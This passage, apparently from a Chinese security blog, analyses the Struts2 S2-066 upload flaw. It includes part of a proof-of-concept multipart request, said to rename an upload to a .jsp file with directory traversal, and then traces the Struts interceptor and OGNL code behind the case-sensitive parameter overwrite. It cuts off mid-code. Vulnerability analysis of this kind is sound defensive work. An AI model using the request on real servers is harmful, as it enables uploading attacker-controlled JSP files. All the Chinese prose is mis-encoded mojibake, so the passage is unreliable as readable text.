(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è¿™ä¸ªæ•°æ®åŒ…å¯å°†ä¸Šä¼ çš„æ–‡ä»¶åè¦†ç›–ä¸º1234.jspï¼Œå¹¶ä¸”å¯ä»¥ç›®å½•ç©¿è¶Š</p><p><img src="https://s2.loli.net/2024/12/17/gCPzfkVAom7UlJb.png" alt="img"><img src="https://s2.loli.net/2024/12/17/xyFU5LptNdmTanh.png" alt="img"></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>ç›¸å…³çš„commitåœ¨<a href="https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163">https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163</a></p><p>æ ¹æ®è¿™ä¸ªæµ‹è¯•ç±»ï¼Œå¯ä»¥çœ‹å‡ºè¿™é‡Œå’ŒHTTPå‚æ•°å¤§å°å†™æ•æ„Ÿæœ‰å…³ï¼Œæ ¹æ®å‡½æ•°åå¯ä»¥çœ‹å‡ºï¼Œåœ¨getå‚æ•°æ—¶åº”è¯¥å¤§å°å†™æ•æ„Ÿï¼Œè€ŒAppendç›¸åŒå‚æ•°æ—¶å¿½ç•¥å¤§å°å†™</p><p>Struts2æœ¬èº«æ˜¯æœ‰ä¸€ç³»åˆ—é»˜è®¤æ‹¦æˆªå™¨ï¼Œè¿™éƒ¨åˆ†é…ç½®åœ¨struts-default.xmlä¸­ï¼Œå…¶ä¸­å°±åŒ…å«äº†ä¸€ä¸ªä¸æ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„æ‹¦æˆªå™¨<code>org.apache.struts2.interceptor.FileUploadInterceptor</code></p><p><img src="https://s2.loli.net/2024/12/17/AGKwEnZ4Oqd7Q5T.png" alt="img"></p><p>ç”¨ä¸€ä¸ªæ­£å¸¸çš„ä¸Šä¼ æ•°æ®åŒ…è°ƒè¯•</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2066.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">hello ph0ebus</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹<code>org.apache.struts2.interceptor.FileUploadInterceptor#intercept</code>è¿™é‡Œçš„é€»è¾‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ActionContext</span> <span class="variable">ac</span> <span class="operator">=</span> invocation.getInvocationContext();</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ac.getServletRequest();</span><br><span class="line">    <span class="keyword">if</span> (!(request <span class="keyword">instanceof</span> MultiPartRequestWrapper)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">ActionProxy</span> <span class="variable">proxy</span> <span class="operator">=</span> invocation.getProxy();</span><br><span class="line">            LOG.debug(<span class="built_in">this</span>.getTextMessage(<span class="string">&quot;struts.messages.bypass.request&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;proxy.getNamespace(), proxy.getActionName()&#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">ValidationAware</span> <span class="variable">validation</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">action</span> <span class="operator">=</span> invocation.getAction();</span><br><span class="line">        <span class="keyword">if</span> (action <span class="keyword">instanceof</span> ValidationAware) &#123;</span><br><span class="line">            validation = (ValidationAware)action;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">MultiPartRequestWrapper</span> <span class="variable">multiWrapper</span> <span class="operator">=</span> (MultiPartRequestWrapper)request;</span><br><span class="line">        <span class="keyword">if</span> (multiWrapper.hasErrors() &amp;&amp; validation != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">TextProvider</span> <span class="variable">textProvider</span> <span class="operator">=</span> <span class="built_in">this</span>.getTextProvider(action);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(LocalizedMessage error : multiWrapper.getErrors()) &#123;</span><br><span class="line">                String errorMessage;</span><br><span class="line">                <span class="keyword">if</span> (textProvider.hasKey(error.getTextKey())) &#123;</span><br><span class="line">                    errorMessage = textProvider.getText(error.getTextKey(), Arrays.asList(error.getArgs()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    errorMessage = textProvider.getText(<span class="string">&quot;struts.messages.error.uploading&quot;</span>, error.getDefaultMessage());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                validation.addActionError(errorMessage);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Enumeration</span> <span class="variable">fileParameterNames</span> <span class="operator">=</span> multiWrapper.getFileParameterNames();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(fileParameterNames != <span class="literal">null</span> &amp;&amp; fileParameterNames.hasMoreElements()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">inputName</span> <span class="operator">=</span> (String)fileParameterNames.nextElement();</span><br><span class="line">            String[] contentType = multiWrapper.getContentTypes(inputName);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.isNonEmpty(contentType)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">                    LOG.warn(<span class="built_in">this</span>.getTextMessage(action, <span class="string">&quot;struts.messages.invalid.content.type&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;inputName&#125;));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String[] fileName = multiWrapper.getFileNames(inputName);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">this</span>.isNonEmpty(fileName)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">                        LOG.warn(<span class="built_in">this</span>.getTextMessage(action, <span class="string">&quot;struts.messages.invalid.file&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;inputName&#125;));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    UploadedFile[] files = multiWrapper.getFiles(inputName);</span><br><span class="line">                    <span class="keyword">if</span> (files != <span class="literal">null</span> &amp;&amp; files.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        List&lt;UploadedFile&gt; acceptedFiles = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(files.length);</span><br><span class="line">                        List&lt;String&gt; acceptedContentTypes = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(files.length);</span><br><span class="line">                        List&lt;String&gt; acceptedFileNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(files.length);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">contentTypeName</span> <span class="operator">=</span> inputName + <span class="string">&quot;ContentType&quot;</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">fileNameName</span> <span class="operator">=</span> inputName + <span class="string">&quot;FileName&quot;</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; files.length; ++index) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="built_in">this</span>.acceptFile(action, files[index], fileName[index], contentType[index], inputName, validation)) &#123;</span><br><span class="line">                                acceptedFiles.add(files[index]);</span><br><span class="line">                                acceptedContentTypes.add(contentType[index]);</span><br><span class="line">                                acceptedFileNames.add(fileName[index]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!acceptedFiles.isEmpty()) &#123;</span><br><span class="line">                            Map&lt;String, Parameter&gt; newParams = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                            newParams.put(inputName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(inputName, acceptedFiles.toArray(<span class="keyword">new</span> <span class="title class_">UploadedFile</span>[acceptedFiles.size()])));</span><br><span class="line">                            newParams.put(contentTypeName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(contentTypeName, acceptedContentTypes.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedContentTypes.size()])));</span><br><span class="line">                            newParams.put(fileNameName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(fileNameName, acceptedFileNames.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedFileNames.size()])));</span><br><span class="line">                            ac.getParameters().appendAll(newParams);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‹¦æˆªå™¨é¦–å…ˆè·å–äº†<code>ActionContext</code>ä¸Šä¸‹æ–‡ï¼Œç„¶åä»ä¸Šä¸‹æ–‡ä¸­è·å–<code>HttpServletRequest</code>å¯¹è±¡ï¼Œç„¶åä»<code>HttpServletRequest</code>å¯¹è±¡ä¸­è·å–æ–‡ä»¶ä¸Šä¼ çš„å„ä¸ªå‚æ•°ã€‚</p><blockquote><p>[File Name] : File - the actual File</p><p>[File Name]ContentType : String - the content type of the file</p><p>[File Name]FileName : String - the actual name of the file uploaded (not the HTML name)</p></blockquote><p>éå†è§£ææ¯ä¸ªæ–‡ä»¶çš„å‚æ•°ï¼ˆè¿™é‡Œåªæœ‰ä¸€ä¸ªæ–‡ä»¶ï¼‰ï¼Œå¦‚æœé€šè¿‡<code>acceptFile()</code>æ–¹æ³•åˆ™å°†å‚æ•°å¡è¿›<code>org.apache.struts2.dispatcher.HttpParameters#parameters</code>å±æ€§ä¸­ã€‚å®Œæˆåè°ƒç”¨ä¸‹ä¸€ä¸ªæ‹¦æˆªå™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!acceptedFiles.isEmpty()) &#123;</span><br><span class="line">    Map&lt;String, Parameter&gt; newParams = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    newParams.put(inputName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(inputName, acceptedFiles.toArray(<span class="keyword">new</span> <span class="title class_">UploadedFile</span>[acceptedFiles.size()])));</span><br><span class="line">    newParams.put(contentTypeName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(contentTypeName, acceptedContentTypes.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedContentTypes.size()])));</span><br><span class="line">    newParams.put(fileNameName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(fileNameName, acceptedFileNames.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedFileNames.size()])));</span><br><span class="line">    ac.getParameters().appendAll(newParams);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒè¯•è·Ÿè¸ªåˆ°<code>ac.getParameters().appendAll(newParams);</code>è¿™æ®µä»£ç å¯ä»¥å‘ç°ç«¯å€ª.è¿™é‡Œå°†æ–‡ä»¶ä¸Šä¼ çš„å‚æ•°ä¿å­˜åˆ°äº†<code>org.apache.struts2.dispatcher.HttpParameters</code>å¯¹è±¡å½“ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> HttpParameters <span class="title function_">appendAll</span><span class="params">(Map&lt;String, Parameter&gt; newParams)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.parameters.putAll(newParams);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æ˜¯<code>HttpParameters#appendAll</code>ï¼Œç»“åˆcommitå¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œä¿®æ”¹åçš„ä»£ç ä¼šå¿½ç•¥å¤§å°å†™ï¼Œé‚£ä¹ˆæ¼æ´ä»£ç åˆ™ä¸ä¼šå¿½ç•¥å¤§å°å†™ï¼Œæ‰€ä»¥å¯èƒ½å­˜åœ¨æŸäº›å˜é‡è¦†ç›–çš„é—®é¢˜</p><p><img src="https://s2.loli.net/2024/12/17/oUBkWsQHCFOVgAN.png" alt="img"></p><p>é‚£ä¹ˆåœ¨<code>cn.ph0ebus.s2066.action.UploadAction#setUploadFileName</code>ä¸‹æ–­ç‚¹çœ‹çœ‹è°ƒç”¨å †æ ˆ</p><p>å¯ä»¥å‘ç°è°ƒç”¨äº†<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>ï¼Œ<code>ParametersInterceptor</code>æ‹¦æˆªå™¨å…¶ä¸»è¦åŠŸèƒ½æ˜¯æŠŠ<code>ActionContext</code>ä¸­çš„è¯·æ±‚å‚æ•°è®¾ç½®åˆ°<code>ValueStack</code>ä¸­ï¼Œå¦‚æœæ ˆé¡¶æ˜¯å½“å‰Actionåˆ™æŠŠè¯·æ±‚å‚æ•°è®¾ç½®åˆ°Actionä¸­ï¼Œå¦‚æœæ ˆé¡¶æ˜¯ä¸€ä¸ªmodel(Actionå®ç°äº†ModelDrivenæ¥å£)åˆ™æŠŠå‚æ•°è®¾ç½®åˆ°äº†modelä¸­ã€‚è¿™é‡Œä¹Ÿå°±æ˜¯ç”¨äºè®¾ç½®<code>UploadAction</code>çš„å‚æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setParameters</span><span class="params">(Object action, ValueStack stack, HttpParameters parameters)</span> &#123;</span><br><span class="line">    HttpParameters params;</span><br><span class="line">    Map&lt;String, Parameter&gt; acceptableParameters;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ordered) &#123;</span><br><span class="line">        params = HttpParameters.create().withComparator(<span class="built_in">this</span>.getOrderedComparator()).withParent(parameters).build();</span><br><span class="line">        acceptableParameters = <span class="keyword">new</span> <span class="title class_">TreeMap</span>(<span class="built_in">this</span>.getOrderedComparator());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        params = HttpParameters.create().withParent(parameters).build();</span><br><span class="line">        acceptableParameters = <span class="keyword">new</span> <span class="title class_">TreeMap</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(Map.Entry&lt;String, Parameter&gt; entry : params.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">parameterName</span> <span class="operator">=</span> (String)entry.getKey();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isAcceptableParameter</span> <span class="operator">=</span> <span class="built_in">this</span>.isAcceptableParameter(parameterName, action);</span><br><span class="line">        isAcceptableParameter &amp;= <span class="built_in">this</span>.isAcceptableParameterValue((Parameter)entry.getValue(), action);</span><br><span class="line">        <span class="keyword">if</span> (isAcceptableParameter) &#123;</span><br><span class="line">            acceptableParameters.put(parameterName, entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ValueStack</span> <span class="variable">newStack</span> <span class="operator">=</span> <span class="built_in">this</span>.valueStackFactory.createValueStack(stack);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">clearableStack</span> <span class="operator">=</span> newStack <span class="keyword">instanceof</span> ClearableValueStack;</span><br><span class="line">    <span class="keyword">if</span> (clearableStack) &#123;</span><br><span class="line">        ((ClearableValueStack)newStack).clearContextValues();</span><br><span class="line">        Map&lt;String, Object&gt; context = newStack.getContext();</span><br><span class="line">        ReflectionContextState.setCreatingNullObjects(context, <span class="literal">true</span>);</span><br><span class="line">        ReflectionContextState.setDenyMethodExecution(context, <span class="literal">true</span>);</span><br><span class="line">        ReflectionContextState.setReportingConversionErrors(context, <span class="literal">true</span>);</span><br><span class="line">        newStack.getActionContext().withLocale(stack.getActionContext().getLocale()).withValueStack(stack);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">memberAccessStack</span> <span class="operator">=</span> newStack <span class="keyword">instanceof</span> MemberAccessValueStack;</span><br><span class="line">    <span class="keyword">if</span> (memberAccessStack) &#123;</span><br><span class="line">        <span class="type">MemberAccessValueStack</span> <span class="variable">accessValueStack</span> <span class="operator">=</span> (MemberAccessValueStack)newStack;</span><br><span class="line">        accessValueStack.useAcceptProperties(<span class="built_in">this</span>.acceptedPatterns.getAcceptedPatterns());</span><br><span class="line">        accessValueStack.useExcludeProperties(<span class="built_in">this</span>.excludedPatterns.getExcludedPatterns());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(Map.Entry&lt;String, Parameter&gt; entry : acceptableParameters.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String)entry.getKey();</span><br><span class="line">        <span class="type">Parameter</span> <span class="variable">value</span> <span class="operator">=</span> (Parameter)entry.getValue();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            newStack.setParameter(name, value.getObject());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.devMode) &#123;</span><br><span class="line">                <span class="built_in">this</span>.notifyDeveloperParameterException(action, name, e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clearableStack) &#123;</span><br><span class="line">        stack.getActionContext().withConversionErrors(newStack.getActionContext().getConversionErrors());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.addParametersToContext(ActionContext.getContext(), acceptableParameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>acceptableParameters</code>æ˜¯<code>TreeMap</code>çš„å¯¹è±¡ï¼Œé»˜è®¤æ ¹æ®keyçš„è‡ªç„¶é¡ºåºå‡åºæ’åºã€‚è¿™é‡Œkeyæ˜¯Stringç±»å‹ï¼Œåˆ™æŒ‰ç…§keyå€¼çš„å­—ç¬¦é€ä¸ªå»è¿›è¡Œæ¯”è¾ƒåˆ¤æ–­çš„ï¼Œå¹¶æŒ‰ç…§ä»å°åˆ°å¤§å‡åºæ’åº</p><p><a href="https://liaoxuefeng.com/books/java/collection/tree-map/index.html">https://liaoxuefeng.com/books/java/collection/tree-map/index.html</a></p><p><a href="https://codegym.cc/groups/posts/java-string-compareto-method">https://codegym.cc/groups/posts/java-string-compareto-method</a></p><p>äºæ˜¯æœ€ç»ˆæ”¾å…¥<code>acceptableParameters</code>çš„å‚æ•°é”®å€¼å¯¹æ˜¯æœ‰åºçš„ï¼Œè€Œå¤§å°å†™ä¼šå½±å“é¡ºåºï¼Œå°å†™å­—ç¬¦æ’åºæ›´åé¢ã€‚é‚£ä¹ˆåœ¨è°ƒç”¨<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setParameter</code>è®¾ç½®<code>UploadAction</code>çš„å‚æ•°æ—¶ï¼Œç”±äºæœ€ç»ˆè°ƒç”¨åˆ° java bean çš„ setter æ–¹æ³•ï¼Œå¦‚æœå‡ºç°ç›¸åŒå‚æ•°åé¦–å­—æ¯å¤§å°å†™éƒ½å­˜åœ¨çš„æƒ…å†µï¼Œé‚£ä¹ˆåœ¨è®¾ç½®å‚æ•°å€¼æ—¶éƒ½ä¼šè°ƒç”¨åˆ°ç›¸åŒçš„ setter æ–¹æ³•ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Œè¿™é‡Œç®€å•è·Ÿä¸€ä¸‹ä»£ç </p><p>æ ¹æ®åˆšåˆšç»™åœ¨<code>cn.ph0ebus.s2066.action.UploadAction#setUploadFileName</code>ä¸‹æ–­ç‚¹æ—¶çš„å †æ ˆä¿¡æ¯ä¸­ï¼Œå¯ä»¥åˆ†æå‡ºè°ƒç”¨ java bean çš„ setter æ–¹æ³•è®¾ç½®å‚æ•°å€¼çš„é€»è¾‘ï¼Œå¯ä»¥ç»™<code>ognl.OgnlRuntime#getSetMethod</code>ä¸‹æ–­ç‚¹ã€‚</p><p>è‡³äºè°ƒç”¨ç›¸åŒsetteræ–¹æ³•çš„å…·ä½“é€»è¾‘åœ¨<code>ognl.OgnlRuntime#capitalizeBeanPropertyName</code>è¿™é‡Œï¼Œè§„èŒƒåŒ–<code>propertyName</code>ï¼Œä¹Ÿæ˜¯æ ¹æ®java beançš„getterå’Œsetteræ–¹æ³•è§„èŒƒæ¥çš„ã€‚å¾ˆå®¹æ˜“ç†è§£ã€‚ä¾‹å¦‚å½“<code>propertyName</code>ä¸ºabcå’ŒAbcï¼Œè¿”å›å€¼å‡ä¸ºAbcï¼Œæœ€åè·å–åˆ°setAbcæ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">capitalizeBeanPropertyName:2609, OgnlRuntime (ognl)</span><br><span class="line">getDeclaredMethods:2651, OgnlRuntime (ognl)</span><br><span class="line">_getSetMethod:2915, OgnlRuntime (ognl)</span><br><span class="line">getSetMethod:2884, OgnlRuntime (ognl)</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">capitalizeBeanPropertyName</span><span class="params">(String propertyName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (propertyName.length() == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName.toUpperCase();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;()&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">3</span>, <span class="number">4</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;set&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;)&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">3</span>, <span class="number">4</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;is&quot;</span>) &amp;&amp; propertyName.endsWith(<span 